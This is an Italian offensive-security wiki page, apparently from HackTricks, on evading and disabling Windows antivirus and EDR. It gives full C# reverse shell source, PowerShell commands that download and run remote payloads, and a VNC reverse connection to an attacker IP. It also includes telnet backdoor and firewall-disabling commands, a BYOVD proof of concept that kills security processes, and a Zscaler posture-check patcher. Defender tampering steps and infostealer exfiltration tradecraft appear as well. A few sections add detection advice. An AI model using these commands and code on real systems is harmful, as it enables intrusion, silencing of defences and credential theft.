Token stomping è una tecnica che permette a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurre i privilegi in modo che il processo non muoia ma non abbia i permessi per controllare attività malevole.

Per prevenire questo Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop su un PC vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Download da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricarlo.
2. Esegui l'installer silenziosamente sulla vittima (admin richiesto): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. Il wizard ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il comando fornito con qualche aggiustamento: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasione è un argomento molto complesso, a volte bisogna tenere in considerazione molteplici sorgenti di telemetry in un solo sistema, quindi è praticamente impossibile rimanere totalmente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti trovi avrà i suoi punti di forza e di debolezza.

Ti incoraggio fortemente a guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'introduzione a tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questa è anche un'altra ottima presentazione di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** finché **non scopre quale parte Defender** considera malevola e te la segnalerà.\
Un altro tool che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (preferisci i download bin, non il setup)

**ON THE HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ all'interno della **victim**

#### **Reverse connection**

L'**attacker** dovrebbe eseguire sul suo **host** il binario `vncviewer.exe -listen 5900` così sarà pronto a intercettare una reverse **VNC connection**. Poi, sulla **victim**: avvia il demone `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Per mantenere la stealth evita di fare le seguenti cose

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilare il nostro reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Scaricamento ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disabilitare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *firmato*** e lo abusa per eseguire operazioni privilegiate in kernel che anche i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Driver firmato**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` dell’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver possiede una firma Microsoft valida viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **servizio kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo spazio utente.
3. **IOCTLs esposti dal driver**
| Codice IOCTL | Capacità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario per PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario su disco |
| `0x990001D0` | Scaricare il driver e rimuovere il servizio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD bypassa completamente le protezioni in user-mode; il codice che esegue in kernel può aprire processi *protetti*, terminarli o manomettere oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la block list di driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti il caricamento di `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi servizi *kernel* e generare allerta quando un driver viene caricato da una directory scrivibile da tutti o non è presente nella lista consentiti.  
•  Monitorare handle in user-mode verso oggetti device custom seguiti da sospette chiamate `DeviceIoControl`.

### Bypass dei controlli di posture di Zscaler Client Connector tramite patching dei binari su disco

Zscaler’s Client Connector applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente client-side** (viene inviato al server un booleano).
2. Gli endpoint RPC interni verificano solo che l'eseguibile connesso sia **firmato da Zscaler** (via `WinVerifyTrust`).

Patchando quattro binari firmati su disco entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale patchata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Torna sempre `1` quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può connettersi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Saltati |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo service stack:

* **All** posture checks mostrano **green/compliant**.
* Unsigned or modified binaries possono aprire gli endpoint RPC named-pipe (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host ottiene accesso illimitato alla rete interna definita dalle Zscaler policies.

Questo case study dimostra come decisioni di trust puramente client-side e semplici signature checks possano essere bypassate con pochi byte patch.

## Abuso di Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impone una signer/level hierarchy in modo che solo processi protetti di pari o superiore livello possano tamperare tra loro. In ambito offensivo, se puoi legittimamente lanciare un PPL-enabled binary e controllarne gli arguments, puoi convertire funzionalità benign (e.g., logging) in una constrained, PPL-backed write primitive verso directory protette usate da AV/EDR.

What makes a process run as PPL
- L'EXE target (e qualsiasi DLL caricata) deve essere signed con un PPL-capable EKU.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un compatible protection level che corrisponda al signer del binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-lancia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non riesce a interpretare percorsi contenenti spazi; usare percorsi 8.3 (short paths) per puntare a posizioni normalmente protette.

Aiuti per percorsi 8.3
- Elencare i nomi corti: `dir /x` in ogni directory padre.
- Derivare il percorso 8.3 in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avviare la LOLBIN capace di PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (es. CreateProcessAsPPL).
2) Passare l'argomento log-path a ClipUp per forzare la creazione di un file in una directory AV protetta (es. Defender Platform). Usare nomi 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (es. MsMpEng.exe), pianificare la scrittura all'avvio prima che l'AV si avvii installando un servizio auto-start che venga eseguito prima in modo affidabile. Verificare l'ordine di boot con Process Monitor (boot logging).
4) Al riavvio la scrittura con supporto PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Esempio di invocazione (percorsi redatti/accorciati per sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Non puoi controllare i contenuti che ClipUp scrive oltre al posizionamento; la primitiva è più adatta alla corruzione che all'iniezione precisa di contenuti.
- Richiede amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- La tempistica è critica: il target non deve essere aperto; l'esecuzione all'avvio evita i blocchi dei file.

Detections
- Creazione del processo `ClipUp.exe` con argomenti insoliti, specialmente se avviato da launcher non standard, durante l'avvio.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e che partono sistematicamente prima di Defender/AV. Investigare la creazione/modifica dei servizi prima dei fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari di Defender e sulle directory Platform; creazioni/modifiche di file inaspettate da processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo del livello PPL da parte di binari non-AV.

Mitigations
- WDAC/Code Integrity: limitare quali binari firmati possono girare come PPL e sotto quali processi genitori; bloccare l'invocazione di ClipUp al di fuori di contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi ad avvio automatico e monitorare la manipolazione dell'ordine di avvio.
- Assicurarsi che Defender tamper protection e le protezioni di early-launch siano abilitate; indagare gli errori di avvio che indicano corruzione dei binari.
- Considerare la disabilitazione della generazione di nomi brevi 8.3 sui volumi che ospitano strumenti di sicurezza se compatibile con il tuo ambiente (testare accuratamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender sceglie la piattaforma da cui eseguirsi enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (es., `4.18.25070.5-0`), poi avvia i processi del servizio Defender da lì (aggiornando i percorsi nei servizi/registro di conseguenza). Questa selezione si fida delle voci di directory inclusi i directory reparse points (symlinks). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un percorso scrivibile dall'attaccante e ottenere DLL sideloading o l'interruzione del servizio.

Preconditions
- Amministratore locale (necessario per creare directory/symlinks sotto la cartella Platform)
- Capacità di riavviare o forzare la re-selezione della piattaforma di Defender (restart del servizio all'avvio)
- Richiesti solo strumenti integrati (mklink)

Why it works
- Defender blocca le scritture nelle proprie cartelle, ma la sua selezione della piattaforma si fida delle voci di directory e sceglie la versione lexicograficamente più alta senza validare che la destinazione risolva verso un percorso protetto/affidabile.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Inserire/sostituire DLLs che Defender carica dalla sua directory dell'applicazione per eseguire codice nei processi di Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovi il version-symlink in modo che al prossimo avvio il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce escalation di privilegi di per sé; richiede privilegi di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams possono spostare l'evasione a runtime fuori dall'implant C2 e nel modulo target stesso hookando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice controllato dall'attaccante, position‑independent (PIC). Questo estende l'evasione oltre la ridotta superficie di API esposta da molti kit (es., CreateProcessA) e applica le stesse protezioni a BOFs e DLL post‑exploitation.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Mascheramento/ri-mascheramento della memoria attorno alla chiamata (es., crittografare le regioni beacon, RWX→RX, cambiare nomi/permessi delle pagine) e ripristino post‑call.
  - Call‑stack spoofing: costruire uno stack benigno e transitare nella API target in modo che l'analisi della call‑stack risolva nei frame attesi.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Funziona per qualsiasi codice che usa l'import hookato, senza modificare il codice degli strumenti o dipendere da Beacon per proxyare API specifiche.
- Copre le DLL post‑ex: hookare LoadLibrary* permette di intercettare i caricamenti di moduli (es., System.Management.Automation.dll, clr.dll) e applicare lo stesso mascheramento/evasione della stack alle loro chiamate API.
- Ripristina l'uso affidabile di comandi post‑ex che spawnano processi contro rilevamenti basati sulla call‑stack avvolgendo CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo uso dell'import. Reflective loaders like TitanLdr/AceLdr dimostrano hooking durante DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale che hai catturato prima della patch o tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs costruiscono una catena di chiamate finta (indirizzi di return verso moduli benigni) e poi pivotano nella real API.
- Questo sconfigge rilevazioni che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbinalo a tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Operational integration
- Preponi il reflective loader alle post‑ex DLL in modo che il PIC e gli hook si inizializzino automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target così Beacon e BOFs traggono vantaggio in modo trasparente dallo stesso percorso di evasione senza modifiche al codice.

Detection/DFIR considerations
- IAT integrity: voci che risolvono in indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: indirizzi di return che non appartengono a immagini caricate; transizioni brusche verso PIC non‑image; ascendenza RtlUserThreadStart incoerente.
- Loader telemetry: scritture in‑process alla IAT, attività precoce in DllMain che modifica import thunks, regioni RX inaspettate create al load.
- Image‑load evasion: se si effettua hooking su LoadLibrary*, monitora caricamenti sospetti di automation/clr assemblies correlati con eventi di memory masking.

Related building blocks and examples
- Reflective loaders che eseguono IAT patching durante il load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustra come gli info‑stealer moderni combinano AV bypass, anti‑analysis e accesso alle credenziali in un unico workflow.

### Keyboard layout gating & sandbox delay

- Un flag di config (`anti_cis`) enumera le keyboard layouts installate via `GetKeyboardLayoutList`. Se viene trovata una layout cirillica, il sample lascia un marker `CIS` vuoto e termina prima di eseguire gli stealers, assicurando che non detonino mai su località escluse mentre lascia un artefatto per il hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica stratificata `check_antivm` logic

- Variant A walks the process list, hashes each name with a custom rolling checksum, and compares it against embedded blocklists for debuggers/sandboxes; it repeats the checksum over the computer name and checks working directories such as `C:\analysis`.
- Variant B inspects system properties (process-count floor, recent uptime), calls `OpenServiceA("VBoxGuest")` to detect VirtualBox Guest Additions, and performs timing checks around sleeps to spot single-stepping. Any hit aborts before modules launch.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Raccolta modulare in memoria & chunked HTTP exfil

- `create_memory_based_log` itera una tabella di puntatori a funzione globale `memory_generators` e crea un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il numero di file dopo una finestra di join di ~45s.
- Una volta terminato, tutto viene compresso con la libreria `miniz` linkata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` poi dorme 15s e streamma l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, spoofando un browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionale `w: <campaign_tag>`, e l'ultimo chunk aggiunge `complete: true` in modo che il C2 sappia che il riassemblaggio è completo.

## Riferimenti

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
